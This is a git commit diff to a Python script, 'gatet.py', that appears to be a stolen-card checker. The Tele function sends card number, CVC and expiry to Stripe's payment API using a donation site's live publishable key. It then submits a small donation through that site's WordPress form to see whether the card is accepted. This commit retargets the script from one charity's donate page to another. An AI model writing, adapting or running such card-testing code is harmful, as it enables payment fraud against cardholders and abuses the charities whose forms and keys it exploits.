344159f30ed791a387ab23d72229187a15a6780d
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-17 22:53:51 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,25 +26,25 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&key=pk_live_51PtXIOKIlclKgpY4obEYB54G8GGCA1zvm2v8LG7kB457oZVSEF2IiqxpERJnRmjTUionNQk7bgqMs4I5OVUOt7xU00mQqASzsT'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&key=pk_live_51P3NpSLxkq1DmcIzN7Q0oc425vK4pBk0uHWpsCQUdZvTOZFjzNKPzQ7tesjTo9JbkDMKkIOcYgEg231A2zzg2KCQ00yW9qeFoV'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '78f8c5b4-fa95-462c-828c-767f967199ee20da47',
-	    '__stripe_sid': '7976025e-b8f7-4044-b9f7-254926126bfbc64853',
+	    '__stripe_mid': '99244f4b-124d-4365-a53e-94dfd94f1fa79b2c81',
+	    '__stripe_sid': '9e424b1f-643d-41f3-b5d0-a3504cbb927fadbdec',
 	}
 	
 	headers = {
-	    'authority': 'letstalkwellwomen.org',
+	    'authority': 'emanuil.bg',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=78f8c5b4-fa95-462c-828c-767f967199ee20da47; __stripe_sid=7976025e-b8f7-4044-b9f7-254926126bfbc64853',
-	    'origin': 'https://letstalkwellwomen.org',
-	    'referer': 'https://letstalkwellwomen.org/donate-now/',
+	    # 'cookie': '__stripe_mid=99244f4b-124d-4365-a53e-94dfd94f1fa79b2c81; __stripe_sid=9e424b1f-643d-41f3-b5d0-a3504cbb927fadbdec',
+	    'origin': 'https://emanuil.bg',
+	    'referer': 'https://emanuil.bg/darenie/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -56,22 +56,16 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744876903165',
+	    't': '1744904897713',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=2964&_fluentform_8_fluentformnonce=0723a58bd8&_wp_http_referer=%2Fdonate-now%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&donation_amount=Other&custom_payment_amt=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=17&_fluentform_5_fluentformnonce=fb9a23e3a7&_wp_http_referer=%2Fdarenie%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&dropdown=%D0%9E%D0%B1%D1%89%D0%BE%20%D0%B4%D0%B0%D1%80%D0%B5%D0%BD%D0%B8%D0%B5&payment_input=%D0%98%D1%81%D0%BA%D0%B0%D0%BC%20%D0%B4%D0%B0%20%D0%B2%D1%8A%D0%B2%D0%B5%D0%B4%D0%B0%20%D1%81%D1%83%D0%BC%D0%B0%20%D0%BF%D0%BE%20%D0%B8%D0%B7%D0%B1%D0%BE%D1%80&custom-payment-amount=5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '8',
+	    'form_id': '5',
 	}
 	
-	r2 = requests.post(
-	    'https://letstalkwellwomen.org/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	r2 = requests.post('https://emanuil.bg/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
 	
